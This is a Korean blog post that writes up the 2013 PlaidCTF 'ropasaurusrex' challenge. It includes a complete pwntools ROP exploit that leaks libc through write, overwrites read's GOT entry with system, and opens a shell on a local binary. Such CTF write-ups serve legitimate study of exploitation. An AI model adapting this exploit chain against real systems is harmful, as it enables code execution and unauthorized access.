---
layout: post
title: "2013 PlaidCTF ropasaurusrex Write up"
excerpt: "ROP를 공부하기 적합한 간단한 문제"
date: 2020-05-07
categories: [system, ctf]
comments: true
---

요세는 새로운 내용을 공부하는게 아닌 기존 지식들을 다시 되돌아보고 있는중이다. 이 문제는 워낙 rop를 공부할때 

유용하다고 평이 나있는 문제라 다시 풀어봤다.

1. binary

![image-20200515044725964](C:\Users\kangs\AppData\Roaming\Typora\typora-user-images\image-20200515044725964.png)

2. code

![image-20200515044806221](C:\Users\kangs\AppData\Roaming\Typora\typora-user-images\image-20200515044806221.png)

심볼이 없어서 함수명이 저렇게 출력된다. return을 하면서 read하는걸 이용하여 공격하면 될 것 같다.

3. gadget, plt , got , offset, bss

이제 익스를 위하여 드래곤볼을 해야한다. 

plt, got,symbol은 모두  pwntool의 기능을 이용하여 해결하였다.

```python
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
wirte_got = e.got['write']
sys_offset = s.symbols['system']
read_offset = s.symbols['read']
```

gadget은 objdump를 사용했다.

![image-20200515045306690](C:\Users\kangs\AppData\Roaming\Typora\typora-user-images\image-20200515045306690.png)

bss영역 주소는 readelf를 사용했다.

![image-20200515045246046](C:\Users\kangs\AppData\Roaming\Typora\typora-user-images\image-20200515045246046.png)

4. exploit

```python
from pwn import *
e = ELF("./ropasaurusrex")
p = process("./ropasaurusrex")
s = ELF("/lib32/libc.so.6")

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
wirte_got = e.got['write']
sys_offset = s.symbols['system']
read_offset = s.symbols['read']
pppr = 0x80484b6
bss = 0x08049628

pay = 'A' *140
pay += p32(write_plt)
pay += p32(pppr)
pay += p32(1)
pay += p32(read_got)
pay += p32(4)

pay += p32(read_plt)
pay += p32(pppr)
pay += p32(0)
pay += p32(bss)
pay += p32(8)

pay += p32(read_plt)
pay += p32(pppr)
pay += p32(0)
pay += p32(read_got)
pay += p32(4)

pay += p32(read_plt)
pay += 'A' *4
pay += p32(bss)

p.sendline(pay)
read_addr = u32(p.recv(4))
libc = read_addr - read_offset
sys_addr = libc + sys_offset
p.send("/bin/sh")
p.sendline(p32(sys_addr))
p.interactive()

```

나만 그런진 모르겠는데 문제 아카이브를 받았을때 libc정보가 없었다. 그래서 libc-database를 이용하여 해당 libc를 구해서 풀었다. 

![image-20200515044617085](C:\Users\kangs\AppData\Roaming\Typora\typora-user-images\image-20200515044617085.png)

다음엔 원샷을 이용하여 해결하는 방법도 해보고싶다. 